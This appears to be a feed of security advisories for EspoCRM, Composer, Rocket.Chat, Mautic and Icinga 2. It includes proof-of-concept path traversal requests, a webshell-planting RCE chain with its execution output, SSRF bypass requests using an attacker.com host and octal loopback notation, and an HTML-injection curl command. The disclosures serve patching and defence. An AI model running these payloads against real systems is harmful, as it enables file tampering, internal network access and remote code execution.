item.title: [HIGH] espocrm/espocrm – Admin TemplateManager path traversal allows arbitrary file read write and delete
item.description:
## Summary The admin template management endpoints accept attacker-controlled `name` and `scope` values and pass them into template path construction without normalization or traversal filtering. As a result, an authenticated admin can use `../` sequences to escape the intended template directory and read, create, overwrite, or delete arbitrary files that resolve to `body.tpl` or `subject.tpl` under the web application user's filesystem permissions.
## Details EspoCRM exposes generic controller action routes over the API. The admin UI uses them to call: - `GET /api/v1/TemplateManager/action/getTemplate` - `POST /api/v1/TemplateManager/action/saveTemplate` - `POST /api/v1/TemplateManager/action/resetTemplate`
View on GitHub: [application/Espo/Resources/routes.json#L112-L118](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/Resources/routes.json#L112-L118)
[client/src/views/admin/template-manager/edit.js#L93-L96](https://github.com/espocrm/espocrm/blob/9.3.3/client/src/views/admin/template-manager/edit.js#L93-L96)
[client/src/views/admin/template-manager/edit.js#L152-L172](https://github.com/espocrm/espocrm/blob/9.3.3/client/src/views/admin/template-manager/edit.js#L152-L172)
[client/src/views/admin/template-manager/edit.js#L205-L216](https://github.com/espocrm/espocrm/blob/9.3.3/client/src/views/admin/template-manager/edit.js#L205-L216)
On the server side, `TemplateManager` takes `name` and `scope` directly from the request and forwards them to `TemplateFileManager`:
View on GitHub: [application/Espo/Controllers/TemplateManager.php#L66-L88](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/Controllers/TemplateManager.php#L66-L88)
[application/Espo/Controllers/TemplateManager.php#L95-L128](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/Controllers/TemplateManager.php#L95-L128)
[application/Espo/Controllers/TemplateManager.php#L134-L166](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/Controllers/TemplateManager.php#L134-L166)
`TemplateFileManager` then interpolates those values into filesystem paths without sanitization:
View on GitHub: [application/Espo/Core/Utils/TemplateFileManager.php#L97-L132](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/Core/Utils/TemplateFileManager.php#L97-L132)
[application/Espo/Core/Utils/TemplateFileManager.php#L148-L160](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/Core/Utils/TemplateFileManager.php#L148-L160)
Finally, `FileReader` and `FileManager` operate on the resulting path as-is:
View on GitHub: [application/Espo/Core/Utils/Resource/FileReader.php#L53-L61](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/Core/Utils/Resource/FileReader.php#L53-L61)
[application/Espo/Core/Utils/Resource/FileReader.php#L72-L108](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/Core/Utils/Resource/FileReader.php#L72-L108)
```php public function getActionGetTemplate(Request $request): stdClass { $name = $request->getQueryParam('name'); $scope = $request->getQueryParam('scope');
$returnData->body = $templateFileManager->getTemplate($name, 'body', $scope);
if ($hasSubject) { $returnData->subject = $templateFileManager->getTemplate($name, 'subject', $scope); } }
public function postActionSaveTemplate(Request $request): bool { $data = $request->getParsedBody(); $scope = !empty($data->scope) ? $data->scope : null;
if (isset($data->subject)) { $templateFileManager->saveTemplate($data->name, 'subject', $data->subject, $scope); }
if (isset($data->body)) { $templateFileManager->saveTemplate($data->name, 'body', $data->body, $scope); } }
private function getCustomFilePath( string $language, string $type, string $name, ?string $entityType = null ): string { if ($entityType) { return "custom/Espo/Custom/Resources/templates/{$type}/{$language}/{$entityType}/{$name}.tpl"; }
return "custom/Espo/Custom/Resources/templates/{$type}/{$language}/{$name}.tpl"; }
public function read(string $path, Params $params): string { $exactPath = $this->findExactPath($path, $params);
if (!$exactPath) { throw new RuntimeException("Resource file '$path' does not exist."); }
return $this->fileManager->getContents($exactPath); } ```
Because `name` becomes the `{$type}` segment and `scope` becomes the `{$entityType}` segment, an attacker can supply values such as `../../../../../../../../tmp/docker-proof-1774295507767` and escape the intended `custom/Espo/Custom/Resources/templates/` root. The primitive is limited by the hardcoded filenames, so the attacker controls the destination directory but the final files are still named `body.tpl` and `subject.tpl`.
## PoC The issue was reproduced on tag `9.3.3` with an authenticated admin session in the browser. The proof below writes files into `/tmp` inside the Docker container, demonstrating that traversal is not limited to the application tree.
1. Open the admin template manager UI and issue the save request with a traversal payload:
```http POST /api/v1/TemplateManager/action/saveTemplate HTTP/1.1 Host: 127.0.0.1:8080 Content-Type: application/json
{ "scope": "EmailTemplate", "name": "../../../../../../../../tmp/docker-proof-1774295507767", "subject": "SUBJECT_docker-proof-1774295507767", "body": "BODY_docker-proof-1774295507767", "language": "en_US" } ```
Observed result in the browser and Burp Proxy:
```text HTTP/1.1 200 OK
true ```
2. Verify on the Docker filesystem that the application created files outside the intended template directory:
```bash docker compose exec app sh -lc 'ls -l /tmp/docker-proof-1774295507767/en_US/EmailTemplate' docker compose exec app sh -lc 'cat /tmp/docker-proof-1774295507767/en_US/EmailTemplate/body.tpl' docker compose exec app sh -lc 'cat /tmp/docker-proof-1774295507767/en_US/EmailTemplate/subject.tpl' ```
Observed result:
```text -rw-rw-r-- 1 www-data www-data ... body.tpl -rw-rw-r-- 1 www-data www-data ... subject.tpl
BODY_docker-proof-1774295507767 SUBJECT_docker-proof-1774295507767 ```
3. Read the traversed files back through the same vulnerable API:
```http GET /api/v1/TemplateManager/action/getTemplate?scope=EmailTemplate&name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fdocker-proof-1774295507767&language=en_US HTTP/1.1 Host: 127.0.0.1:8080 ```
Observed result:
```json {"body":"BODY_docker-proof-1774295507767","subject":"SUBJECT_docker-proof-1774295507767"} ```
4. Delete the traversed files with the reset flow:
```http POST /api/v1/TemplateManager/action/resetTemplate HTTP/1.1 Host: 127.0.0.1:8080 Content-Type: application/json
{ "scope": "EmailTemplate", "name": "../../../../../../../../tmp/docker-proof-1774295507767", "language": "en_US" } ```
Observed result:
```text HTTP/1.1 500 Internal Server Error ```
This `500` happens after deletion, because the endpoint removes the traversed files and then attempts to read them again.
5. Verify the files were removed from the container:
```bash docker compose exec app sh -lc 'test ! -e /tmp/docker-proof-1774295507767/en_US/EmailTemplate/body.tpl && test ! -e /tmp/docker-proof-1774295507767/en_US/EmailTemplate/subject.tpl && echo removed' ```
Observed result:
```text removed ```
## Impact This is a path traversal vulnerability in an admin-facing feature.
An authenticated admin can: - Read arbitrary files ending in `body.tpl` or `subject.tpl` outside the intended template directories. - Create or overwrite such files in attacker-chosen directories reachable by traversal under the web application's effective filesystem permissions. - Delete such files through the reset flow.
Depending on deployment layout, this can impact: - Template integrity for other features and modules. - Sensitive files stored with matching names. - Application availability if important `.tpl` files are overwritten or deleted.
The attack surface is externally reachable over HTTP, but exploitation requires admin privileges.
## Remediation Do not concatenate user-controlled template identifiers directly into filesystem paths.
Recommended fixes: - Strictly allowlist valid template names and scope values. - Reject `..`, `/`, `\\`, and other path metacharacters before path construction. - Resolve the final path with canonicalization and verify that it remains inside the intended template root. - Apply the same validation to both read and write/delete flows.
---

item.title: [CRITICAL] espocrm/espocrm – Authenticated RCE via Formula with path traversal in attachment `sourceId`, exploitable by admin user
item.description:
## Note from vendor
Exploitable only by an admin user. The step with writing to .htaccess (which should not be enabled on production) is not necessary, as a PHP code can be injected into some PHP file instead with the same impact.
Writing the Attachment `sourceId` field in Formula is widely used by our users to copy attachments (for example to re-use the same attachment file).
## Summary EspoCRM's built-in formula scripting engine allowing updating attachment's sourceId thus allowing an authenticated admin to overwrite the `sourceId` field on `Attachment` entities. Because `sourceId` is concatenated directly into a file path with no sanitization in `EspoUploadDir::getFilePath()`, an attacker can redirect any file read or write operation to an arbitrary path within the web server's `open_basedir` scope.
## Details The vulnerability is a chain of two root causes that individually rate as High severity and together produce Critical/RCE.
### Root Cause 1: Formula allows to update Attachment's `sourceId`
The formula engine's `record\update` allows updating entity attributes with arbitrary values.
### Root Cause 2: Unsanitized `sourceId` in File Path Construction
**File:** `application/Espo/Core/FileStorage/Storages/EspoUploadDir.php` (~line 115–119)
```php protected function getFilePath(Attachment $attachment) { $sourceId = $attachment->getSourceId(); return 'data/upload/' . $sourceId; // No basename(), realpath(), or .. check } ```
This method is used for **both reads and writes**. If `sourceId` contains path traversal sequences (e.g., `../../client/shell`), the resolved path escapes `data/upload/`.
**File:** `application/Espo/Tools/Attachment/UploadService.php` (~line 133–157, method `uploadChunk`)
```php $filePath = $this->getAttachmentRepository()->getFilePath($attachment); $this->fileManager->appendContents($filePath, $contents); ```
The chunk upload endpoint retrieves the *current* `sourceId` from the database at the time of the upload request. If `sourceId` was modified between attachment creation and chunk upload (via the formula engine — Root Cause 1), the write goes to the attacker-controlled path.
`fileManager->appendContents()` calls `checkCreateFile()` which creates intermediate directories as needed — no existing file or directory is required.
### Attack Chain
The two root causes combine as follows:
1. Create an `Attachment` entity with `isBeingUploaded: true` using a benign `.txt` filename and `relatedType: Document` (passes the extension whitelist check). 2. Use `POST /api/v1/Formula/action/run` with `record\update("Attachment", "<id>", "sourceId", "../../client/<shell>")` to overwrite `sourceId` with a path-traversal string pointing to the web root. 3. Upload the PHP webshell via `POST /api/v1/Attachment/chunk/<id>` with `Content-Type: application/octet-stream` and body `data:application/octet-stream;base64,<base64_payload>`. The write lands at `client/<shell>` — inside the Apache document root — but Apache won't execute it without a PHP handler directive. 4. Repeat steps 1–3 for a second attachment, redirecting `sourceId` to `../../.htaccess`, and appending a `FilesMatch` directive that registers the specific shell filename as a PHP handler. 5. `GET /client/<shell>?c=id` => `uid=33(www-data) gid=33(www-data)`.
### PoC See attached PoC script. The full chain completes in six HTTP requests against a default EspoCRM v9.3.3 installation on Apache/PHP (Debian). No non-default configuration is required. [espo_pwn.sh](https://github.com/user-attachments/files/26159046/espo_pwn.sh)
Here is the output of a successful exploitation attempt: ``` [*] Target : http://192.168.5.16:8090 [*] User : admin
[1/6] Creating webshell attachment... Attachment ID: 69be311e8c131f1b7 [2/6] Setting sourceId via formula ... sourceId → ../../client/x [3/6] Writing PHP webshell to client/x... Response: true [4/6] Creating .htaccess attachment... Attachment ID: 69be311f5c29e493e [5/6] Redirecting to .htaccess via formula... sourceId → ../../.htaccess [6/6] Appending PHP handler directive to .htaccess... Response: true
[*] Executing: id Webshell: http://192.168.5.16:8090/client/x?c=<cmd>
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[+] RCE CONFIRMED ```
### Impact Authenticated Remote Code Execution (OS-level command execution)
### Attribution Discovered by: Jiva (JivaSecurity)

item.title: [HIGH] composer/composer – Command injection via malicious Perforce repository definition
item.description:
### Impact The `Perforce::generateP4Command()` method constructed shell commands by interpolating user-supplied Perforce connection parameters (port, user, client) without proper escaping. An attacker controlling a repository configuration in a malicious composer.json declaring a Perforce VCS repository could inject arbitrary commands through these values, leading to command execution in the context of the user running Composer. Composer would execute these injected commands even if Perforce is not installed.
VCS repositories are only loaded from the root composer.json file located in the directory you execute Composer commands in and from the composer config directory (e.g. `~/.config/composer/composer.json`). So this vulnerability cannot be exploited through composer.json files of packages installed as dependencies.
You are at risk of command execution if you run Composer commands on untrusted projects with attacker supplied composer.json files, regardless of whether you or any of your dependencies use Perforce.
### Patches Fixed in Composer 2.2.27 (2.2 LTS) and 2.9.6 (mainline)
### Workarounds - Carefully inspect composer.json files before running Composer on them. Verify that Perforce-related fields contain valid values. - Only run Composer commands on projects from trusted sources.

item.title: [HIGH] composer/composer – Command injection via malicious Perforce source reference/url
item.description:
### Impact The `Perforce::syncCodeBase()` method appended the `$sourceReference` parameter to a shell command without proper escaping, allowing an attacker to inject arbitrary commands through a crafted source reference containing shell metacharacters. Further as in GHSA-wg36-wvj6-r67p / CVE-2026-40176 the `Perforce::generateP4Command()` method constructed shell commands by interpolating user-supplied Perforce connection parameters (port, user, client) without proper escaping from the source url field. Composer would execute these injected commands even if Perforce is not installed.
The source reference and url are provided as part of package metadata. Any Composer package repository can serve package metadata declaring perforce as a source type with a malicious source reference or source url. This means the vulnerability can be exploited through any package served by a compromised or malicious Composer repository. An attack does not require Perforce to be installed on the client, as Composer will attempt to execute the constructed command regardless.
This vulnerability is exploitable when installing or updating dependencies from source (`--prefer-source`, default when installing dev prefixed versions), even if you do not use Perforce.
### Patches Fixed in Composer 2.2.27 (2.2 LTS) and 2.9.6 (mainline)
Note, the fix for the source url in the `Perforce::generateP4Command()` was addressed as part of the patches for GHSA-wg36-wvj6-r67p / CVE-2026-40176 in the same versions.
### Workarounds
- Avoid installing dependencies from source by using `--prefer-dist` or the `preferred-install: dist` config setting. - Only use trusted Composer repositories.

item.title: [MEDIUM] espocrm/espocrm – Email importEml can import and delete another user's attachment by raw fileId
[MEDIUM] espocrm/espocrm – Stored HTML injection in email notifications about stream notes via Markdown allowing HTML markup
item.description:
### Summary A stored HTML injection vulnerability in EspoCRM allows authenticated users with standard (non-administrative) privileges to inject arbitrary HTML into system-generated email notifications. The issue occurs because the `post` field in stream activity notifications is rendered using unescaped Handlebars triple-brace syntax (`{{{post}}}`), enabling attackers to deliver phishing content and tracking payloads via trusted system emails. --- ### Details EspoCRM uses server-side Handlebars templates to generate email notifications for stream activities (`notePost`, `notePostNoParent`, `mention`). These templates render the `post` field using triple braces: ```handlebars This results in raw HTML output without escaping. The `post` value is processed using `Michelf\Markdown::defaultTransform()`, which allows inline HTML by default: ```php public $no_markup = false; ``` As a result, attacker-controlled HTML is preserved during Markdown transformation. The processed value is then passed as `additionalData` to the Htmlizer: ```php $data['post'] = $post; ``` During rendering, the Htmlizer explicitly skips attributes present in `additionalData`: ```php if ($additionalData && array_key_exists($attribute, $additionalData)) { continue; } ``` This means the `post` field is never passed through any formatting or sanitization step. Additionally, the original `post` content is stored without sanitization: ```php public function handlePostText(Note $entity): void { $post = $entity->getPost(); $post = preg_replace($regexp, '\1[\3/\4](#\3/view/\4)', $post); $entity->setPost($post); } ``` This creates a pipeline where user-controlled HTML is accepted, preserved, and rendered directly into email templates without escaping. --- ### PoC The issue was reproduced using a **non-administrative user account with default "User" role permissions**. No elevated privileges are required. 1. Authenticate as a regular user (e.g., `testuser`). 2. Send the following request: ```bash curl -X POST "http://localhost:8080/api/v1/Note" \ -H "Authorization: Basic $(echo -n 'testuser:Test1234!' | base64)" \ -H "Content-Type: application/json" \ -d '{ "post": "
⚠️ EspoCRM Security Notice: Re-auth required Click here
", "parentType": "Contact", "parentId": "", "type": "Post" }' ``` 3. Please note that: * The request succeeds (HTTP 200) * An email notification is automatically sent * The email body contains the injected HTML without escaping * External resources (e.g., tracking pixel) are requested when the email is opened 4. The resulting email contains content such as: ```html

Test User posted on contact...

...

``` A raw email sample (`.eml`) demonstrating the injected HTML --- ###Impact This vulnerability allows any authenticated user to inject arbitrary HTML into trusted system-generated emails. Impacts include: * Phishing attacks using legitimate system email context * Injection of attacker-controlled links * User tracking via embedded resources (e.g., image beacons) * UI manipulation within email content Emails are sent using the system’s configured SMTP identity (e.g., administrative sender), making the malicious content appear fully trusted to recipients. The @mention feature enables targeted delivery to specific users, increasing the effectiveness of phishing attacks. No elevated privileges are required to exploit this issue.

item.title: [LOW] espocrm/espocrm – SSRF via DNS Rebinding in Attachment fromImageUrl Endpoint Allows Internal Network Access
item.description:
## Summary
The `POST /api/v1/Attachment/fromImageUrl` endpoint is vulnerable to SSRF via a DNS resolution inconsistency. Host validation uses `dns_get_record()` while the actual HTTP request uses curl's internal resolver (`gethostbyname()`), creating a time-of-check vs time-of-use (TOCTOU) condition. An attacker can exploit this gap to bypass internal IP restrictions and reach internal network services that are not externally accessible.
## Details
The vulnerability exists in `HostCheck::isNotInternalHost()`:
**`application/Espo/Core/Utils/Security/HostCheck.php`** ```php public function isNotInternalHost(string $host): bool { $records = dns_get_record($host, DNS_A); // real DNS only, ignores /etc/hosts
if (filter_var($host, FILTER_VALIDATE_IP)) { return $this->ipAddressIsNotInternal($host); }
if (!$records) { return true; // secondary issue: empty DNS result implicitly allows the host }
foreach ($records as $record) { $idAddress = $record['ip'] ?? null; if (!$idAddress) return false; if (!$this->ipAddressIsNotInternal($idAddress)) return false; }
return true; } ```
**Two issues identified:**
**Issue 1 - TOCTOU via DNS rebinding:** `dns_get_record()` queries the DNS resolver directly and ignores local resolution sources such as `/etc/hosts`. curl resolves hostnames via `gethostbyname()`, which reads `/etc/hosts` first before querying DNS. This means the two lookups can return different IP addresses for the same hostname a classic DNS rebinding condition. The validation happens against one IP while the connection is made to another.
**Issue 2 - Empty DNS result bypasses check:** If `dns_get_record()` returns no A records (DNS failure, IPv6-only domain, or non-existent hostname), the function returns `true` without further validation, implicitly allowing the host. This may enable additional bypasses using malformed or IPv6-only domains.
**`application/Espo/Tools/Attachment/UploadUrlService.php`**
The check happens entirely before the curl request with no post-connect validation: ```php if (!$this->urlCheck->isNotInternalUrl($url)) { throw new ForbiddenSilent("Not allowed URL."); } $response = curl_exec($ch); // no secondary IP check after connection ```
## PoC
**Environment:** EspoCRM Docker instance, any authenticated user account with attachment access (default configuration).
**Required:** A domain whose DNS resolves to a public IP (passes `HostCheck`), with the ability to control how the server resolves it at connection time.
**Steps to reproduce:**
1. Register a domain (e.g. `attacker.com`) with TTL=0, initially pointing to a public IP address to pass the `HostCheck` validation.
2. Send the following request: ```http POST /api/v1/Attachment/fromImageUrl HTTP/1.1 Host: target.espocrm.com Authorization: Basic <base64(user:pass)> Content-Type: application/json
{ "url": "http://attacker.com:3306/image.jpg", "field": "attachments", "parentType": "KnowledgeBaseArticle" } ```
3. After `HostCheck` resolves the domain to the public IP (passes), flip the DNS record to point to an internal IP (e.g. `192.168.1.1`). With TTL=0, the next resolution by curl returns the internal IP.
4. The server connects to the internal host. Response confirms bypass: - `403 Forbidden` check blocked the request (expected for direct IPs) - `500 Internal Server Error` + `X-Status-Reason: Bad image data` curl reached the internal host (bypass confirmed)
**Test results:**
| Target | Response | Result | |---|---|---| | `http://172.20.0.2:3306` (direct IP) | `403` | Correctly blocked | | `http://attacker.com:3306` (rebind → `172.20.0.2`) | `500 Bad image data` | **Bypassed** | | `http://attacker.com:80` | `500 Bad image data` | **Bypassed** | | `http://attacker.com:22` | `500 Bad image data` | **Bypassed** |
In the test environment the DNS rebinding condition was reproduced by modifying `/etc/hosts` inside the container, which demonstrates the same resolution inconsistency without relying on precise timing.
## Impact
**Type:** Server-Side Request Forgery (SSRF) via DNS Rebinding (TOCTOU)
**Who is affected:** Any EspoCRM installation where authenticated users have attachment creation access, which is the default configuration.
**What an attacker can do:** - Scan internal network ports and map running services - Confirm existence of internal hosts not accessible externally - Interact with internal HTTP-based services, which may expose sensitive information or provide a pivot point for further attacks within the internal network
**What is not possible via this endpoint:** - Data extraction from binary protocol services such as MySQL the endpoint expects image data and discards non-image responses - Remote code execution
**Suggested fix:**
The only reliable mitigation for DNS rebinding is to validate the actual IP address after the connection is established, not before: ```php $response = curl_exec($ch);
$primaryIp = curl_getinfo($ch, CURLINFO_PRIMARY_IP);
if (!filter_var($primaryIp, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) { curl_close($ch); return null; } ```
This eliminates the TOCTOU window entirely because validation happens after the TCP connection is made, regardless of what DNS returned beforehand.

item.title: [MEDIUM] espocrm/espocrm – Authenticated SSRF via internal-host validation bypass using alternative IPv4 notation
item.description: ````md ### Summary An authenticated SSRF vulnerability exists in EspoCRM due to a bypass in the internal-host validation logic. By using an alternative IPv4 representation such as `0177.0.0.1` instead of `127.0.0.1`, an authenticated user can bypass the protection intended to block loopback and other internal addresses. In the confirmed `/api/v1/Attachment/fromImageUrl` flow, this allows the server to make requests to loopback-only services and create an attachment from the fetched response. --- ### Details The issue affects the internal-host validation used to prevent requests to internal destinations. Confirmed affected flow: - `POST /api/v1/Attachment/fromImageUrl` Relevant code in `application/Espo/Core/Utils/Security/HostCheck.php`: ```php public function isNotInternalHost(string $host): bool { $records = dns_get_record($host, DNS_A); if (filter_var($host, FILTER_VALIDATE_IP)) { return $this->ipAddressIsNotInternal($host); } if (!$records) { return true; } foreach ($records as $record) { $idAddress = $record['ip'] ?? null; if (!$idAddress) return false; if (!$this->ipAddressIsNotInternal($idAddress)) return false; } return true; } ```` Root cause: * `HostCheck::isNotInternalHost()` only handles the input as an IP address when `filter_var($host, FILTER_VALIDATE_IP)` succeeds. * Alternative IPv4 forms such as `0177.0.0.1` are not accepted by `filter_var(..., FILTER_VALIDATE_IP)`. * The code then falls back to `dns_get_record()`. * If no DNS records are returned, the function returns `true`, treating the host as safe. * cURL then normalizes the alternative IPv4 form and connects to the loopback destination. Confirmed behavior from testing: * `http://127.0.0.1:9002/interno.png` is blocked with `HTTP 403`. * `http://0177.0.0.1:9002/interno.png` succeeds with `HTTP 200`. * The application creates an attachment from the fetched response. * A loopback listener logs `GET /interno.png`, confirming that the server made the internal request. This appears distinct from CVE-2023-46736, which involved redirect-based SSRF behavior. This report concerns a bypass of the current internal-host validation through alternative IPv4 representations. --- ### PoC Tested on EspoCRM `9.3.3`. #### 1. Start a loopback-only HTTP listener on `127.0.0.1:9002` Create a valid PNG file and start a local listener: ```bash mkdir -p /tmp/ssrf-lab php -r '$d=base64_decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAusB9Wn0K6sAAAAASUVORK5CYII="); file_put_contents("/tmp/ssrf-lab/interno.png",$d);' cd /tmp/ssrf-lab php -S 127.0.0.1:9002 ``` #### 2. Verify that direct loopback access is blocked ```http POST /api/v1/Attachment/fromImageUrl HTTP/1.1 Host: 127.0.0.1:8080 Authorization: Basic Espo-Authorization: Espo-Authorization-By-Token: true Cookie: auth-token-secret=; auth-token= Content-Type: application/json Accept: */* Referer: http://127.0.0.1:8080/ Connection: close {"url":"http://127.0.0.1:9002/interno.png","field":"avatar","parentType":"User"} ``` Expected result: * `HTTP 403 Forbidden` #### 3. Bypass the restriction with octal notation ```http POST /api/v1/Attachment/fromImageUrl HTTP/1.1 Host: 127.0.0.1:8080 Authorization: Basic Espo-Authorization: Espo-Authorization-By-Token: true Cookie: auth-token-secret=; auth-token= Content-Type: application/json Accept: */* Referer: http://127.0.0.1:8080/ Connection: close {"url":"http://0177.0.0.1:9002/interno.png","field":"avatar","parentType":"User"} ``` Observed result: * `HTTP 200 OK` * attachment created successfully Example response: ```json { "id":"69bdf9753eb144f20", "name":"http://0177.0.0.1:9002/interno.png", "type":"image/png", "size":68, "field":"avatar", "parentType":"User" } ``` #### 4. Confirm the server-side request in the loopback listener Observed listener log: ```text [Sat Mar 21 01:50:45 2026] 127.0.0.1:49250 Accepted [Sat Mar 21 01:50:45 2026] 127.0.0.1:49250 [200]: GET /interno.png [Sat Mar 21 01:50:45 2026] 127.0.0.1:49250 Closing ``` This confirms that the application made the request to the loopback-only listener. --- ### Impact This is an authenticated SSRF vulnerability. Confirmed impact: * an authenticated user can bypass the internal-host restriction * the application can be forced to make requests to loopback-only services * in the confirmed `/api/v1/Attachment/fromImageUrl` flow, the fetched response can be stored as an attachment This may allow access to local-only services and other internal resources reachable from the application runtime.

item.title: [HIGH] RocketChat/Rocket.Chat – NoSQL injection in the EE ddp-streamer-service
item.description:
### Issue 2: NoSQL injection in the EE ddp-streamer-service (`GHSL-2026-005`)
A NoSQL injection vulnerability exists in Rocket.Chat's account service used in the `ddp-streamer` micro service that allows unauthenticated attackers to manipulate MongoDB queries during authentication. The vulnerability is located in the username-based login flow where user-supplied input is directly embedded into a MongoDB query selector without validation. An attacker can inject MongoDB operator expressions (e.g., `{ $regex: '.*' }`) in place of a username string, causing the database query to match unintended user records.
The NoSQL injection surface exists in the authentication flow where the `username` parameter from the client is used directly in a MongoDB `findOne` query without type or content validation.
[ee/apps/account-service/src/lib/loginViaUsername.ts](https://github.com/RocketChat/Rocket.Chat/blob/05c415b94cb91907de39a39c6d277579258f334e/ee/apps/account-service/src/lib/loginViaUsername.ts#13): ```typescript Users.findOne<IUser>({ username }, { projection: { 'services.password.bcrypt': 1 } }); ```
The vulnerability is externally reachable through the [`login`](https://github.com/RocketChat/Rocket.Chat/blob/05c415b94cb91907de39a39c6d277579258f334e/ee/apps/ddp-streamer/src/configureServer.ts#L67-L88) method exposed by the ddp-streamer micro service (reachable via `<rocketchat-host>/websocket`):
```typescript server.methods({ async login(resume, user, password) { const result = await Account.login({ resume, user, password }); // ... } }); ```
#### Impact
This issue may lead to enable logins without fully knowing the usernames of users (especially in combination with GHSL-2026-004).
#### Remediation
Validate that the `username` parameter is a primitive string before using it in the query and/or use parameterized queries if possible.
#### CWEs
- CWE-943: Improper Neutralization of Special Elements in Data Query Logic
## Credit
These issues were discovered by an AI agent developed by the GitHub Security Lab and reviewed by GHSL team members [@p- (Peter Stöckli)](https://github.com/p-) and [@m-y-mo (Man Yue Mo)](https://github.com/m-y-mo).
## Contact
You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2026-004` or `GHSL-2026-005` in any communication regarding these issues.
## Disclosure Policy
This report is subject to a 90-day disclosure deadline, as described in more detail in our [coordinated disclosure policy](https://securitylab.github.com/advisories#policy).

item.title: [HIGH] RocketChat/Rocket.Chat – 2FA bypass and login of deactivated users via EE ddp-streamer
item.description:
### 2FA bypass and login of deactivated users via EE ddp-streamer (`GHSL-2026-008`)
Authentication vulnerabilities exist in Rocket.Chat's enterprise DDP Streamer service. The `Account.login` method exposed through the DDP Streamer does **not enforce Two-Factor Authentication (2FA) or validate user account status** (deactivated users can still login), despite these checks being mandatory in the standard Meteor login flow.
The code at [`ee/apps/account-service/src/Account.ts#L31-L40`](https://github.com/RocketChat/Rocket.Chat/blob/develop/ee/apps/account-service/src/Account.ts#L31-L40) does not enforce a 2FA check and it does not validate the account status of a user, whereas [`onValidateLogin`](https://github.com/RocketChat/Rocket.Chat/blob/c5f7dcb80a3b99d6ec7c06a16b2ea6841a06c373/apps/meteor/app/2fa/server/loginHandler.ts#L27C3-L27C18) [checks the TOTP](https://github.com/RocketChat/Rocket.Chat/blob/c5f7dcb80a3b99d6ec7c06a16b2ea6841a06c373/apps/meteor/app/2fa/server/loginHandler.ts#L43) code and [validateLoginAttemptAsync](https://github.com/RocketChat/Rocket.Chat/blob/c5f7dcb80a3b99d6ec7c06a16b2ea6841a06c373/apps/meteor/app/authentication/server/startup/index.js#L391) checks if the [user is active](https://github.com/RocketChat/Rocket.Chat/blob/c5f7dcb80a3b99d6ec7c06a16b2ea6841a06c373/apps/meteor/app/authentication/server/startup/index.js#L420).
#### Impact
This missing user account status checked might lead to deactivated users being able to login. The missing 2FA enforcement might lead to successful account takeover through a brute-force based attack (e.g. password spraying).
#### Remediation
Enforce 2FA in `Account.login` and reject logins for users where `active === false` in both `loginViaUsername.ts` and `loginViaResume.ts`.
**Long-term Recommendations** - Consolidate authentication logic to ensure all login paths use the same security controls - Add integration tests that verify 2FA is enforced across all authentication endpoints
#### CWEs
- CWE-287: Improper Authentication - CWE-304: Missing Critical Step in Authentication
## Credit
These issues were discovered by an AI agent developed by the GitHub Security Lab and reviewed by GHSL team members [@p- (Peter Stöckli)](https://github.com/p-) and [@m-y-mo (Man Yue Mo)](https://github.com/m-y-mo).
## Contact
You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2026-008` or `GHSL-2026-009` in any communication regarding these issues.
## Disclosure Policy
This report is subject to a 90-day disclosure deadline, as described in more detail in our [coordinated disclosure policy](https://securitylab.github.com/advisories#policy).

[HIGH] mautic/mautic – SQL Injection in Contact Activity API Sorting
item.description:
### Summary This advisory addresses a SQL injection vulnerability in the API endpoint used for retrieving contact activities. A vulnerability exists in the query construction for the Contact Activity timeline where the parameter responsible for determining the sort direction was not strictly validated against an allowlist, potentially allowing authenticated users to inject arbitrary SQL commands via the API.
### Mitigation
Please update to **4.4.19**, **5.2.10**, **6.0.8**, **7.0.1** or later.
### Workarounds
None.
### References
If you have any questions or comments about this advisory:
Email us at [security@mautic.org](mailto:security@mautic.org)

item.title: [MEDIUM] icinga/icinga2 – Insecure permission of %ProgramData%\icinga2\var on Windows
item.description:
### Impact
The Icinga 2 MSI did not set appropriate permissions for the `%ProgramData%\icinga2\var` folder on Windows. This resulted in the its contents - including the private key of the user and synced configuration - being readable by all local users. All installations on Windows are affected.
Please note that a fix for a similar issue in Icinga for Windows is released at the same time, see [GHSA-88h5-rrm6-5973](https://github.com/Icinga/icinga-powershell-framework/security/advisories/GHSA-88h5-rrm6-5973).
### Patches
The following fixed versions were released: v2.15.2, v2.14.8, v2.13.14
### Workarounds
There are two possibilities to work around the issue without upgrading Icinga 2: 1. Upgrade Icinga for Windows to at least version v1.13.4, v1.12.4, or v1.11.2. These version will automatically fix the ACLs for the Icinga 2 agent as well. 2. Manually update the ACL for the given folder `C:\ProgramData\icinga2\var` (and `C:\Program Files\WindowsPowerShell\modules\icinga-powershell-framework\certificate` to fix the issue for the Icinga for Windows as well) including every sub-folder and item to restrict access for general users, only allowing the Icinga service user and administrators access.
### References
- [Release announcement blog post](https://icinga.com/blog/releasing-icinga-2-v2-15-2-v2-14-8-v2-13-14-and-icinga-for-windows-v1-13-4-v1-12-4-v1-11-2/) - Related Icinga for Windows issue: [GHSA-88h5-rrm6-5973](https://github.com/Icinga/icinga-powershell-framework/security/advisories/GHSA-88h5-rrm6-5973)

item.title: [HIGH] RocketChat/Rocket.Chat – Unauthorized Access to OAuth App Details (Versions ≤ 6.12.0)
item.description:
### Summary A vulnerability in Rocket.Chat <6.12.0 allows low-privileged users, if they know an app ID, to access sensitive information about configured OAuth applications by invoking an API endpoint that lacks proper authorization checks.
### Details In Rocket.Chat versions up to 6.12.0, the API endpoint `GET /api/v1/oauth-apps.get` is exposed to any authenticated user, regardless of their role or permissions. This endpoint returns an OAuth application, as long as the user knows its ID, including potentially sensitive fields such as `client_id` and `client_secret`.
### PoC #### Steps to Reproduce:
